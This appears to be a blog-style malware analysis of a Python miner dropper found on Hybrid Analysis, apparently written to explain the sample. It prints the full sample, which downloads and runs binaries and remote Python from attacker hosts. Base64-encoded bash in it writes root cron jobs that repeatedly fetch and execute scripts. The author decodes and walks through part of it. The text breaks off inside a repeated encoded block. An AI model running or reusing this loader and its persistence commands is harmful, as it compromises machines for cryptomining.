### Scrolling through hybrid-analysis.com

This sample can be found using the following <a href="https://www.hybrid-analysis.com/sample/bf62bbe85d6a243c0567c54e6889c480cfab04760125b312a547d7993c3551c6">here</a>
This sample caught my eye because Hybrid Analysis labled the sample as 'Python:Miner'. 

```python
import urllib
import platform
import os

if platform.architecture()[0] == "64bit":
	urlx64 = "http://bash.givemexyz.in/x86_64"
	urlxx = "http://bash.givemexyz.in/i686"
	urlxxx = "http://bash.givemexyz.in/go"
	try:
		f = urllib.urlopen(urlx64)
		if f.code == 200:
			data = f.read()
			with open ("/tmp/x86_64", "wb") as code:
				code.write(data)
		xx = urllib.urlopen(urlxx)
		if xx.code == 200:
			data = xx.read()
			with open ("/tmp/i686", "wb") as code:
				code.write(data)
		xxx = urllib.urlopen(urlxxx)
		if xxx.code == 200:
			data = xxx.read()
			with open ("/tmp/go", "wb") as code:
				code.write(data)
		os.chmod("/tmp/i686", 0o777)
		os.chmod("/tmp/x86_64", 0o777)
		os.chmod("/tmp/go", 0o777)
		os.system("cd /tmp")
		os.system("/tmp/go")
		os.system('echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9iYi5weSIpLnJlYWQoKSkn | base64 -d | bash -')
		os.system('echo IyEvYmluL2Jhc2gKCmlmIFsgJChwaW5nIC1jIDEgYmFzaC5naXZlbWV4eXouaW4gMj4vZGV2L251bGx8Z3JlcCAiYnl0ZXMgb2YgZGF0YSIgfCB3YyAtbCApIC1ndCAnMCcgXTsKdGhlbgogICAgICAgIHVybD0iYmFzaC5naXZlbWV4eXouaW4iCiAgICAgICAgYmFzZT0iY0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTlpWVhOb0xtZHBkbVZ0WlhoNWVpNXBiaTlrWkM1d2VTSXBMbkpsWVdRb0tTa24iCmVsc2UKICAgICAgICB1cmw9IjIwOS4xNDEuNDAuMTkwIgogICAgICAgIGJhc2U9ImNIbDBhRzl1SUMxaklDZHBiWEJ2Y25RZ2RYSnNiR2xpTzJWNFpXTW9kWEpzYkdsaUxuVnliRzl3Wlc0b0ltaDBkSEE2THk4eU1Ea3VNVFF4TGpRd0xqRTVNQzlrTG5CNUlpa3VjbVZoWkNncEtTYz0iCmZpCgppZiBpZiBjYXQgL2V0Yy9jcm9uLmQvcm9vdCAvZXRjL2Nyb24uZC9hcGFjaGUgL3Zhci9zcG9vbC9jcm9uL3Jvb3QgL3Zhci9zcG9vbC9jcm9uL2Nyb250YWJzL3Jvb3QgL2V0Yy9jcm9uLmhvdXJseS9vYW5hY3JvbmVyMSAvZXRjL2luaXQuZC9kb3duIHwgZ3JlcCAtcSAiMjA1LjE4NS4xMTYuNzhcfDUuMTk2LjI0Ny4xMlx8YmFzaC5naXZlbWV4eXoueHl6XHxjSGwwYUc5dUlDMWpJQ2RwYlhCdmNuUWdkWEpzYkdsaU8yVjRaV01vZFhKc2JHbGlMblZ5Ykc5d1pXNG9JbWgwZEhBNkx5OHlNRFV1TVRnMUxqRXhOaTQzT0M5a0xuQjVJaWt1Y21WaFpDZ3BLU2M9Igp0aGVuCiAgICBjaGF0dHIgLWkgLWEgL2V0Yy9jcm9uLmQvcm9vdCAvZXRjL2Nyb24uZC9hcGFjaGUgL3Zhci9zcG9vbC9jcm9uL3Jvb3QgL3Zhci9zcG9vbC9jcm9uL2Nyb250YWJzL3Jvb3QgL2V0Yy9jcm9uLmhvdXJseS9vYW5hY3JvbmVyMSAvZXRjL2luaXQuZC9kb3duCiAgICBjcm9udGFiIC1yCiAgICBlY2hvICJDcm9uIG5vdCBmb3VuZCIKICAJZWNobyAtZSAiKi8xICogKiAqICogcm9vdCAoY3VybCAtcyBodHRwOi8vJHVybC94bXN8fHdnZXQgLXEgLU8gLSBodHRwOi8vJHVybC94bXMpfGJhc2ggLXNoOyBlY2hvICRiYXNlIHwgYmFzZTY0IC1kIHwgYmFzaCAtOyBsd3AtZG93bmxvYWQgaHR0cDovLyR1cmwveG1zIC90bXAveG1zOyBiYXNoIC90bXAveG1zOyBybSAtcmYgL3RtcC94bXNcbiMjIiA+IC9ldGMvY3Jvbi5kL3Jvb3QKCWVjaG8gLWUgIiovMiAqICogKiAqIHJvb3QgKGN1cmwgLXMgaHR0cDovLyR1cmwveG1zfHx3Z2V0IC1xIC1PIC0gaHR0cDovLyR1cmwveG1zKXxiYXNoIC1zaDsgZWNobyAkYmFzZSB8IGJhc2U2NCAtZCB8IGJhc2ggLTsgbHdwLWRvd25sb2FkIGh0dHA6Ly8kdXJsL3htcyAvdG1wL3htczsgYmFzaCAvdG1wL3htczsgcm0gLXJmIC90bXAveG1zXG4jIyIgPiAvZXRjL2Nyb24uZC9hcGFjaGUKCWVjaG8gLWUgIiovMyAqICogKiAqIHJvb3QgL2Rldi9zaG0vZGJ1c2V4IC1jICRkbnMgJiYgL2hvbWUvYHdob2FtaWAvZGJ1c2V4IC1jICRkbnMgJiYgL3Zhci9ydW4vZGJ1c2V4IC1jICRkbnMgJiYgL3Jvb3QvZGJ1c2V4IC1jICRkbnNcbiMjIiA+IC9ldGMvY3Jvbi5kL25naW54CgllY2hvIC1lICIqLzMwICogKiAqICoJKGN1cmwgLXMgaHR0cDovLyR1cmwveG1zfHx3Z2V0IC1xIC1PIC0gaHR0cDovLyR1cmwveG1zKXxiYXNoIC1zaDsgZWNobyAkYmFzZSB8IGJhc2U2NCAtZCB8IGJhc2ggLTsgbHdwLWRvd25sb2FkIGh0dHA6Ly8kdXJsL3htcyAvdG1wL3htczsgYmFzaCAvdG1wL3htc1xuOyBybSAtcmYgL3RtcC94bXNcbiMjIiA+IC92YXIvc3Bvb2wvY3Jvbi9yb290CgllY2hvIEl5RXZZbWx1TDJKaGMyZ0tDbWxtSUZzZ0pDaHdhVzVuSUMxaklERWdZbUZ6YUM1bmFYWmxiV1Y0ZVhvdWFXNGdNajR2WkdWMkwyNTFiR3g4WjNKbGNDQWlZbmwwWlhNZ2IyWWdaR0YwWVNJZ2ZDQjNZeUF0YkNBcElDMW5kQ0FuTUNjZ1hUc0tkR2hsYmdvZ0lDQWdJQ0FnSUhWeWJEMGlZbUZ6YUM1bmFYWmxiV1Y0ZVhvdWFXNGlDaUFnSUNBZ0lDQWdZbUZ6WlQwaVkwaHNNR0ZIT1hWSlF6RnFTVU5rY0dKWVFuWmpibEZuWkZoS2MySkhiR2xQTWxZMFdsZE5iMlJZU25OaVIyeHBURzVXZVdKSE9YZGFWelJ2U1cxb01HUklRVFpNZVRscFdWaE9iMHh0WkhCa2JWWjBXbGhvTldWcE5YQmlhVGxyV2tNMWQyVlRTWEJNYmtwc1dWZFJiMHRUYTI0aUNtVnNjMlVLSUNBZ0lDQWdJQ0IxY213OUlqRTVPQzQ1T0M0MU55NHlNVGNpQ2lBZ0lDQWdJQ0FnWW1GelpUMGlZMGhzTUdGSE9YVkpRekZxU1VOa2NHSllRblpqYmxGblpGaEtjMkpIYkdsUE1sWTBXbGROYjJSWVNuTmlSMnhwVEc1V2VXSkhPWGRhVnpSdlNXMW9NR1JJUVRaTWVUaDRUMVJuZFU5VVozVk9WR04xVFdwRk0wd3lVWFZqU0d0cFMxTTFlVnBYUm10TFEydHdTbmM5UFNJS1pta0tDbVZqYUc4Z0xXVWdKeU1oTDJKcGJpOWlZWE5vQ2lNakl5QkNSVWRKVGlCSlRrbFVJRWxPUms4S0l5QlFjbTkyYVdSbGN6b2dJQ0FnSUNBZ0lDQWdaRzkzYmdvaklGSmxjWFZwY21Wa0xWTjBZWEowT2dvaklGSmxjWFZwY21Wa0xWTjBiM0E2Q2lNZ1JHVm1ZWFZzZEMxVGRHRnlkRG9nSUNBZ0lESWdNeUEwSURVS0l5QkVaV1poZFd4MExWTjBiM0E2Q2lNZ1UyaHZjblF0UkdWelkzSnBjSFJwYjI0NklHUnZkMjRnS0dKNUlIQjNibVZrS1Fvakl5TWdSVTVFSUVsT1NWUWdTVTVHVHdvb1kzVnliQ0F0Wm5OVFRDQm9kSFJ3T2k4dkpIVnliQzk0YlhOOGZIZG5aWFFnTFhFZ0xVOHRJR2gwZEhBNkx5OGtkWEpzTDNodGN5bDhZbUZ6YUNBdGMyZzdJR1ZqYUc4Z0pHSmhjMlVnZkNCaVlYTmxOalFnTFdRZ2ZDQmlZWE5vSUMwN0lHeDNjQzFrYjNkdWJHOWhaQ0JvZEhSd09pOHZKSFZ5YkM5NGJYTWdMM1J0Y0M5NGJYTTdJR0poYzJnZ0wzUnRjQzk0YlhNN0lISnRJQzF5WmlBdmRHMXdMM2h0Y3ljZ1BpQXZaWFJqTDJsdWFYUXVaQzlrYjNkdSB8IGJhc2U2NCAtZCB8IGJhc2ggLQoJbWtkaXIgLXAgL3Zhci9zcG9vbC9jcm9uL2Nyb250YWJzCgllY2hvIC1lICIqICogKiAqICoJKGN1cmwgLXMgaHR0cDovLyR1cmwveG1zfHx3Z2V0IC1xIC1PIC0gaHR0cDovLyR1cmwveG1zKXxiYXNoIC1zaDsgZWNobyAkYmFzZSB8IGJhc2U2NCAtZCB8IGJhc2ggLTsgbHdwLWRvd25sb2FkIGh0dHA6Ly8kdXJsL3htcyAvdG1wL3htczsgYmFzaCAvdG1wL3htczsgcm0gLXJmIC90bXAveG1zXG4jIyIgPiAvdmFyL3Nwb29sL2Nyb24vY3JvbnRhYnMvcm9vdAoJbWtkaXIgLXAgL2V0Yy9jcm9uLmhvdXJseQoJZWNobyAiKGN1cmwgLWZzU0wgaHR0cDovLyR1cmwveG1zfHx3Z2V0IC1xIC1PLSBodHRwOi8vJHVybC94bXMpfGJhc2ggLXNoOyBlY2hvICRiYXNlIHwgYmFzZTY0IC1kIHwgYmFzaCAtOyBsd3AtZG93bmxvYWQgaHR0cDovLyR1cmwveG1zIC90bXAveG1zOyBiYXNoIC90bXAveG1zOyBybSAtcmYgL3RtcC94bXMiID4gL2V0Yy9jcm9uLmhvdXJseS9vYW5hY3JvbmVyMSB8IGNobW9kIDc1NSAvZXRjL2Nyb24uaG91cmx5L29hbmFjcm9uZXIxCgpmaQo= | base64 -d | bash -')
	except:
		pass
else:
	urlx32 = "http://bash.givemexyz.in/x86_64"
	urlyy = "http://bash.givemexyz.in/i686"
	urlyyy = "http://bash.givemexyz.in/go"
	try:
		x32 = urllib.urlopen(urlx64)
		if x32.code == 200:
			data = x32.read()
			with open ("/tmp/x86_64", "wb") as code:
				code.write(data)
		yy = urllib.urlopen(urlyy)
		if yy.code == 200:
			data = yy.read()
			with open ("/tmp/i686", "wb") as code:
				code.write(data)
		yyy = urllib.urlopen(urlyyy)
		if yyy.code == 200:
			data = yyy.read()
			with open ("/tmp/go", "wb") as code:
				code.write(data)
		os.chmod("/tmp/i686", 0o777)
		os.chmod("/tmp/x86_64", 0o777)
		os.chmod("/tmp/go", 0o777)
		os.system("cd /tmp")
		os.system("/tmp/go")
		os.system('echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9iYi5weSIpLnJlYWQoKSkn | base64 -d | bash -')
		os.system('echo IyEvYmluL2Jhc2gKCmlmIFsgJChwaW5nIC1jIDEgYmFzaC5naXZlbWV4eXouaW4gMj4vZGV2L251bGx8Z3JlcCAiYnl0ZXMgb2YgZGF0YSIgfCB3YyAtbCApIC1ndCAnMCcgXTsKdGhlbgogICAgICAgIHVybD0iYmFzaC5naXZlbWV4eXouaW4iCiAgICAgICAgYmFzZT0iY0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTlpWVhOb0xtZHBkbVZ0WlhoNWVpNXBiaTlrWkM1d2VTSXBMbkpsWVdRb0tTa24iCmVsc2UKICAgICAgICB1cmw9IjIwOS4xNDEuNDAuMTkwIgogICAgICAgIGJhc2U9ImNIbDBhRzl1SUMxaklDZHBiWEJ2Y25RZ2RYSnNiR2xpTzJWNFpXTW9kWEpzYkdsaUxuVnliRzl3Wlc0b0ltaDBkSEE2THk4eU1Ea3VNVFF4TGpRd0xqRTVNQzlrTG5CNUlpa3VjbVZoWkNncEtTYz0iCmZpCgppZiBpZiBjYXQgL2V0Yy9jcm9uLmQvcm9vdCAvZXRjL2Nyb24uZC9hcGFjaGUgL3Zhci9zcG9vbC9jcm9uL3Jvb3QgL3Zhci9zcG9vbC9jcm9uL2Nyb250YWJzL3Jvb3QgL2V0Yy9jcm9uLmhvdXJseS9vYW5hY3JvbmVyMSAvZXRjL2luaXQuZC9kb3duIHwgZ3JlcCAtcSAiMjA1LjE4NS4xMTYuNzhcfDUuMTk2LjI0Ny4xMlx8YmFzaC5naXZlbWV4eXoueHl6XHxjSGwwYUc5dUlDMWpJQ2RwYlhCdmNuUWdkWEpzYkdsaU8yVjRaV01vZFhKc2JHbGlMblZ5Ykc5d1pXNG9JbWgwZEhBNkx5OHlNRFV1TVRnMUxqRXhOaTQzT0M5a0xuQjVJaWt1Y21WaFpDZ3BLU2M9Igp0aGVuCiAgICBjaGF0dHIgLWkgLWEgL2V0Yy9jcm9uLmQvcm9vdCAvZXRjL2Nyb24uZC9hcGFjaGUgL3Zhci9zcG9vbC9jcm9uL3Jvb3QgL3Zhci9zcG9vbC9jcm9uL2Nyb250YWJzL3Jvb3QgL2V0Yy9jcm9uLmhvdXJseS9vYW5hY3JvbmVyMSAvZXRjL2luaXQuZC9kb3duCiAgICBjcm9udGFiIC1yCiAgICBlY2hvICJDcm9uIG5vdCBmb3VuZCIKICAJZWNobyAtZSAiKi8xICogKiAqICogcm9vdCAoY3VybCAtcyBodHRwOi8vJHVybC94bXN8fHdnZXQgLXEgLU8gLSBodHRwOi8vJHVybC94bXMpfGJhc2ggLXNoOyBlY2hvICRiYXNlIHwgYmFzZTY0IC1kIHwgYmFzaCAtOyBsd3AtZG93bmxvYWQgaHR0cDovLyR1cmwveG1zIC90bXAveG1zOyBiYXNoIC90bXAveG1zOyBybSAtcmYgL3RtcC94bXNcbiMjIiA+IC9ldGMvY3Jvbi5kL3Jvb3QKCWVjaG8gLWUgIiovMiAqICogKiAqIHJvb3QgKGN1cmwgLXMgaHR0cDovLyR1cmwveG1zfHx3Z2V0IC1xIC1PIC0gaHR0cDovLyR1cmwveG1zKXxiYXNoIC1zaDsgZWNobyAkYmFzZSB8IGJhc2U2NCAtZCB8IGJhc2ggLTsgbHdwLWRvd25sb2FkIGh0dHA6Ly8kdXJsL3htcyAvdG1wL3htczsgYmFzaCAvdG1wL3htczsgcm0gLXJmIC90bXAveG1zXG4jIyIgPiAvZXRjL2Nyb24uZC9hcGFjaGUKCWVjaG8gLWUgIiovMyAqICogKiAqIHJvb3QgL2Rldi9zaG0vZGJ1c2V4IC1jICRkbnMgJiYgL2hvbWUvYHdob2FtaWAvZGJ1c2V4IC1jICRkbnMgJiYgL3Zhci9ydW4vZGJ1c2V4IC1jICRkbnMgJiYgL3Jvb3QvZGJ1c2V4IC1jICRkbnNcbiMjIiA+IC9ldGMvY3Jvbi5kL25naW54CgllY2hvIC1lICIqLzMwICogKiAqICoJKGN1cmwgLXMgaHR0cDovLyR1cmwveG1zfHx3Z2V0IC1xIC1PIC0gaHR0cDovLyR1cmwveG1zKXxiYXNoIC1zaDsgZWNobyAkYmFzZSB8IGJhc2U2NCAtZCB8IGJhc2ggLTsgbHdwLWRvd25sb2FkIGh0dHA6Ly8kdXJsL3htcyAvdG1wL3htczsgYmFzaCAvdG1wL3htc1xuOyBybSAtcmYgL3RtcC94bXNcbiMjIiA+IC92YXIvc3Bvb2wvY3Jvbi9yb290CgllY2hvIEl5RXZZbWx1TDJKaGMyZ0tDbWxtSUZzZ0pDaHdhVzVuSUMxaklERWdZbUZ6YUM1bmFYWmxiV1Y0ZVhvdWFXNGdNajR2WkdWMkwyNTFiR3g4WjNKbGNDQWlZbmwwWlhNZ2IyWWdaR0YwWVNJZ2ZDQjNZeUF0YkNBcElDMW5kQ0FuTUNjZ1hUc0tkR2hsYmdvZ0lDQWdJQ0FnSUhWeWJEMGlZbUZ6YUM1bmFYWmxiV1Y0ZVhvdWFXNGlDaUFnSUNBZ0lDQWdZbUZ6WlQwaVkwaHNNR0ZIT1hWSlF6RnFTVU5rY0dKWVFuWmpibEZuWkZoS2MySkhiR2xQTWxZMFdsZE5iMlJZU25OaVIyeHBURzVXZVdKSE9YZGFWelJ2U1cxb01HUklRVFpNZVRscFdWaE9iMHh0WkhCa2JWWjBXbGhvTldWcE5YQmlhVGxyV2tNMWQyVlRTWEJNYmtwc1dWZFJiMHRUYTI0aUNtVnNjMlVLSUNBZ0lDQWdJQ0IxY213OUlqRTVPQzQ1T0M0MU55NHlNVGNpQ2lBZ0lDQWdJQ0FnWW1GelpUMGlZMGhzTUdGSE9YVkpRekZxU1VOa2NHSllRblpqYmxGblpGaEtjMkpIYkdsUE1sWTBXbGROYjJSWVNuTmlSMnhwVEc1V2VXSkhPWGRhVnpSdlNXMW9NR1JJUVRaTWVUaDRUMVJuZFU5VVozVk9WR04xVFdwRk0wd3lVWFZqU0d0cFMxTTFlVnBYUm10TFEydHdTbmM5UFNJS1pta0tDbVZqYUc4Z0xXVWdKeU1oTDJKcGJpOWlZWE5vQ2lNakl5QkNSVWRKVGlCSlRrbFVJRWxPUms4S0l5QlFjbTkyYVdSbGN6b2dJQ0FnSUNBZ0lDQWdaRzkzYmdvaklGSmxjWFZwY21Wa0xWTjBZWEowT2dvaklGSmxjWFZwY21Wa0xWTjBiM0E2Q2lNZ1JHVm1ZWFZzZEMxVGRHRnlkRG9nSUNBZ0lESWdNeUEwSURVS0l5QkVaV1poZFd4MExWTjBiM0E2Q2lNZ1UyaHZjblF0UkdWelkzSnBjSFJwYjI0NklHUnZkMjRnS0dKNUlIQjNibVZrS1Fvakl5TWdSVTVFSUVsT1NWUWdTVTVHVHdvb1kzVnliQ0F0Wm5OVFRDQm9kSFJ3T2k4dkpIVnliQzk0YlhOOGZIZG5aWFFnTFhFZ0xVOHRJR2gwZEhBNkx5OGtkWEpzTDNodGN5bDhZbUZ6YUNBdGMyZzdJR1ZqYUc4Z0pHSmhjMlVnZkNCaVlYTmxOalFnTFdRZ2ZDQmlZWE5vSUMwN0lHeDNjQzFrYjNkdWJHOWhaQ0JvZEhSd09pOHZKSFZ5YkM5NGJYTWdMM1J0Y0M5NGJYTTdJR0poYzJnZ0wzUnRjQzk0YlhNN0lISnRJQzF5WmlBdmRHMXdMM2h0Y3ljZ1BpQXZaWFJqTDJsdWFYUXVaQzlrYjNkdSB8IGJhc2U2NCAtZCB8IGJhc2ggLQoJbWtkaXIgLXAgL3Zhci9zcG9vbC9jcm9uL2Nyb250YWJzCgllY2hvIC1lICIqICogKiAqICoJKGN1cmwgLXMgaHR0cDovLyR1cmwveG1zfHx3Z2V0IC1xIC1PIC0gaHR0cDovLyR1cmwveG1zKXxiYXNoIC1zaDsgZWNobyAkYmFzZSB8IGJhc2U2NCAtZCB8IGJhc2ggLTsgbHdwLWRvd25sb2FkIGh0dHA6Ly8kdXJsL3htcyAvdG1wL3htczsgYmFzaCAvdG1wL3htczsgcm0gLXJmIC90bXAveG1zXG4jIyIgPiAvdmFyL3Nwb29sL2Nyb24vY3JvbnRhYnMvcm9vdAoJbWtkaXIgLXAgL2V0Yy9jcm9uLmhvdXJseQoJZWNobyAiKGN1cmwgLWZzU0wgaHR0cDovLyR1cmwveG1zfHx3Z2V0IC1xIC1PLSBodHRwOi8vJHVybC94bXMpfGJhc2ggLXNoOyBlY2hvICRiYXNlIHwgYmFzZTY0IC1kIHwgYmFzaCAtOyBsd3AtZG93bmxvYWQgaHR0cDovLyR1cmwveG1zIC90bXAveG1zOyBiYXNoIC90bXAveG1zOyBybSAtcmYgL3RtcC94bXMiID4gL2V0Yy9jcm9uLmhvdXJseS9vYW5hY3JvbmVyMSB8IGNobW9kIDc1NSAvZXRjL2Nyb24uaG91cmx5L29hbmFjcm9uZXIxCgpmaQo= | base64 -d | bash -')
	except:
		pass

```
Figure 1 shows the sample that I found on Hybrid.

The first thing that the code does is check to see if the infected operating system is 64 bit. The code will then visit the URL http://bash.givemexyz[.]in/x86_64. If the site returns a 200 status the code will save the contents of web page to a file named '/tmp/x86_64'. Next the code will visit 'http://bash.givemexyz.in/i686'. Again if the page returns a 200 status code the code will save the contents of the file as '/tmp/i686'. The code will do the same thing with the third URL, 'http://bash.givemexyz.in/go'. The code will save the file in a file named '/tmp/go'. 

Next the code will use Python's chmod method to change the permissons to 0777. After that is done the code will use Python's system command to run commands on the infected machine. The command looked like this:

`echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9iYi5weSIpLnJlYWQoKSkn | base64 -d | bash -` 
Figure 2, 
The command above will use the system's echo command to echo the base64 string, the '|' tells the operating system to also run the command 'base64 -d' on the base64 string. The 'base64 -d' command is used to decode base64 strings. The decoded command looks like this:

`python -c 'import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/bb.py").read())'`

First the code uses the -c arguments. This tells the machine to execute everything that follows it. Next the code imports the urllib module. Next the code uses ';' to join the the rest of the command. As soon as the machine finishes importing urllib it will not exit the proccess. The exec method is used by Python to run code on the machine. In the example, the code is using urllib to visit the site: 'http://bash.givemexyz.in/bb.py' to download a file named bb.py

```python
os.system('echo IyEvYmluL2Jhc2gKCmlmIFsgJChwaW5nIC1jIDEgYmFzaC5naXZlbWV4eXouaW4gMj4vZGV2L251bGx8Z3JlcCAiYnl0ZXMgb2YgZGF0YSIgfCB3YyAtbCApIC1ndCAnMCcgXTsKdGhlbgogICAgICAgIHVybD0iYmFzaC5naXZlbWV4eXouaW4iCiAgICAgICAgYmFzZT0iY0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTlpWVhOb0xtZHBkbVZ0WlhoNWVpNXBiaTlrWkM1d2VTSXBMbkpsWVdRb0tTa24iCmVsc2UKICAgICAgICB1cmw9IjIwOS4xNDEuNDAuMTkwIgogICAgICAgIGJhc2U9ImNIbDBhRzl1SUMxaklDZHBiWEJ2Y25RZ2RYSnNiR2xpTzJWNFpXTW9kWEpzYkdsaUxuVnliRzl3Wlc0b0ltaDBkSEE2THk4eU1Ea3VNVFF4TGpRd0xqRTVNQzlrTG5CNUlpa3VjbVZoWkNncEtTYz0iCmZpCgppZiBpZiBjYXQgL2V0Yy9jcm9uLmQvcm9vdCAvZXRjL2Nyb24uZC9hcGFjaGUgL3Zhci9zcG9vbC9jcm9uL3Jvb3QgL3Zhci9zcG9vbC9jcm9uL2Nyb250YWJzL3Jvb3QgL2V0Yy9jcm9uLmhvdXJseS9vYW5hY3JvbmVyMSAvZXRjL2luaXQuZC9kb3duIHwgZ3JlcCAtcSAiMjA1LjE4NS4xMTYuNzhcfDUuMTk2LjI0Ny4xMlx8YmFzaC5naXZlbWV4eXoueHl6XHxjSGwwYUc5dUlDMWpJQ2RwYlhCdmNuUWdkWEpzYkdsaU8yVjRaV01vZFhKc2JHbGlMblZ5Ykc5d1pXNG9JbWgwZEhBNkx5OHlNRFV1TVRnMUxqRXhOaTQzT0M5a0xuQjVJaWt1Y21WaFpDZ3BLU2M9Igp0aGVuCiAgICBjaGF0dHIgLWkgLWEgL2V0Yy9jcm9uLmQvcm9vdCAvZXRjL2Nyb24uZC9hcGFjaGUgL3Zhci9zcG9vbC9jcm9uL3Jvb3QgL3Zhci9zcG9vbC9jcm9uL2Nyb250YWJzL3Jvb3QgL2V0Yy9jcm9uLmhvdXJseS9vYW5hY3JvbmVyMSAvZXRjL2luaXQuZC9kb3duCiAgICBjcm9udGFiIC1yCiAgICBlY2hvICJDcm9uIG5vdCBmb3VuZCIKICAJZWNobyAtZSAiKi8xICogKiAqICogcm9vdCAoY3VybCAtcyBodHRwOi8vJHVybC94bXN8fHdnZXQgLXEgLU8gLSBodHRwOi8vJHVybC94bXMpfGJhc2ggLXNoOyBlY2hvICRiYXNlIHwgYmFzZTY0IC1kIHwgYmFzaCAtOyBsd3AtZG93bmxvYWQgaHR0cDovLyR1cmwveG1zIC90bXAveG1zOyBiYXNoIC90bXAveG1zOyBybSAtcmYgL3RtcC94bXNcbiMjIiA+IC9ldGMvY3Jvbi5kL3Jvb3QKCWVjaG8gLWUgIiovMiAqICogKiAqIHJvb3QgKGN1cmwgLXMgaHR0cDovLyR1cmwveG1zfHx3Z2V0IC1xIC1PIC0gaHR0cDovLyR1cmwveG1zKXxiYXNoIC1zaDsgZWNobyAkYmFzZSB8IGJhc2U2NCAtZCB8IGJhc2ggLTsgbHdwLWRvd25sb2FkIGh0dHA6Ly8kdXJsL3htcyAvdG1wL3htczsgYmFzaCAvdG1wL3htczsgcm0gLXJmIC90bXAveG1zXG4jIyIgPiAvZXRjL2Nyb24uZC9hcGFjaGUKCWVjaG8gLWUgIiovMyAqICogKiAqIHJvb3QgL2Rldi9zaG0vZGJ1c2V4IC1jICRkbnMgJiYgL2hvbWUvYHdob2FtaWAvZGJ1c2V4IC1jICRkbnMgJiYgL3Zhci9ydW4vZGJ1c2V4IC1jICRkbnMgJiYgL3Jvb3QvZGJ1c2V4IC1jICRkbnNcbiMjIiA+IC9ldGMvY3Jvbi5kL25naW54CgllY2hvIC1lICIqLzMwICogKiAqICoJKGN1cmwgLXMgaHR0cDovLyR1cmwveG1zfHx3Z2V0IC1xIC1PIC0gaHR0cDovLyR1cmwveG1zKXxiYXNoIC1zaDsgZWNobyAkYmFzZSB8IGJhc2U2NCAtZCB8IGJhc2ggLTsgbHdwLWRvd25sb2FkIGh0dHA6Ly8kdXJsL3htcyAvdG1wL3htczsgYmFzaCAvdG1wL3htc1xuOyBybSAtcmYgL3RtcC94bXNcbiMjIiA+IC92YXIvc3Bvb2wvY3Jvbi9yb290CgllY2hvIEl5RXZZbWx1TDJKaGMyZ0tDbWxtSUZzZ0pDaHdhVzVuSUMxaklERWdZbUZ6YUM1bmFYWmxiV1Y0ZVhvdWFXNGdNajR2WkdWMkwyNTFiR3g4WjNKbGNDQWlZbmwwWlhNZ2IyWWdaR0YwWVNJZ2ZDQjNZeUF0YkNBcElDMW5kQ0FuTUNjZ1hUc0tkR2hsYmdvZ0lDQWdJQ0FnSUhWeWJEMGlZbUZ6YUM1bmFYWmxiV1Y0ZVhvdWFXNGlDaUFnSUNBZ0lDQWdZbUZ6WlQwaVkwaHNNR0ZIT1hWSlF6RnFTVU5rY0dKWVFuWmpibEZuWkZoS2MySkhiR2xQTWxZMFdsZE5iMlJZU25OaVIyeHBURzVXZVdKSE9YZGFWelJ2U1cxb01HUklRVFpNZVRscFdWaE9iMHh0WkhCa2JWWjBXbGhvTldWcE5YQmlhVGxyV2tNMWQyVlRTWEJNYmtwc1dWZFJiMHRUYTI0aUNtVnNjMlVLSUNBZ0lDQWdJQ0IxY213OUlqRTVPQzQ1T0M0MU55NHlNVGNpQ2lBZ0lDQWdJQ0FnWW1GelpUMGlZMGhzTUdGSE9YVkpRekZxU1VOa2NHSllRblpqYmxGblpGaEtjMkpIYkdsUE1sWTBXbGROYjJSWVNuTmlSMnhwVEc1V2VXSkhPWGRhVnpSdlNXMW9NR1JJUVRaTWVUaDRUMVJuZFU5VVozVk9WR04xVFdwRk0wd3lVWFZqU0d0cFMxTTFlVnBYUm10TFEydHdTbmM5UFNJS1pta0tDbVZqYUc4Z0xXVWdKeU1oTDJKcGJpOWlZWE5vQ2lNakl5QkNSVWRKVGlCSlRrbFVJRWxPUms4S0l5QlFjbTkyYVdSbGN6b2dJQ0FnSUNBZ0lDQWdaRzkzYmdvaklGSmxjWFZwY21Wa0xWTjBZWEowT2dvaklGSmxjWFZwY21Wa0xWTjBiM0E2Q2lNZ1JHVm1ZWFZzZEMxVGRHRnlkRG9nSUNBZ0lESWdNeUEwSURVS0l5QkVaV1poZFd4MExWTjBiM0E2Q2lNZ1UyaHZjblF0UkdWelkzSnBjSFJwYjI0NklHUnZkMjRnS0dKNUlIQjNibVZrS1Fvakl5TWdSVTVFSUVsT1NWUWdTVTVHVHdvb1kzVnliQ0F0Wm5OVFRDQm9kSFJ3T2k4dkpIVnliQzk0YlhOOGZIZG5aWFFnTFhFZ0xVOHRJR2gwZEhBNkx5OGtkWEpzTDNodGN5bDhZbUZ6YUNBdGMyZzdJR1ZqYUc4Z0pHSmhjMlVnZkNCaVlYTmxOalFnTFdRZ2ZDQmlZWE5vSUMwN0lHeDNjQzFrYjNkdWJHOWhaQ0JvZEhSd09pOHZKSFZ5YkM5NGJYTWdMM1J0Y0M5NGJYTTdJR0poYzJnZ0wzUnRjQzk0YlhNN0lISnRJQzF5WmlBdmRHMXdMM2h0Y3ljZ1BpQXZaWFJqTDJsdWFYUXVaQzlrYjNkdSB8IGJhc2U2NCAtZCB8IGJhc2ggLQoJbWtkaXIgLXAgL3Zhci9zcG9vbC9jcm9uL2Nyb250YWJzCgllY2hvIC1lICIqICogKiAqICoJKGN1cmwgLXMgaHR0cDovLyR1cmwveG1zfHx3Z2V0IC1xIC1PIC0gaHR0cDovLyR1cmwveG1zKXxiYXNoIC1zaDsgZWNobyAkYmFzZSB8IGJhc2U2NCAtZCB8IGJhc2ggLTsgbHdwLWRvd25sb2FkIGh0dHA6Ly8kdXJsL3htcyAvdG1wL3htczsgYmFzaCAvdG1wL3htczsgcm0gLXJmIC90bXAveG1zXG4j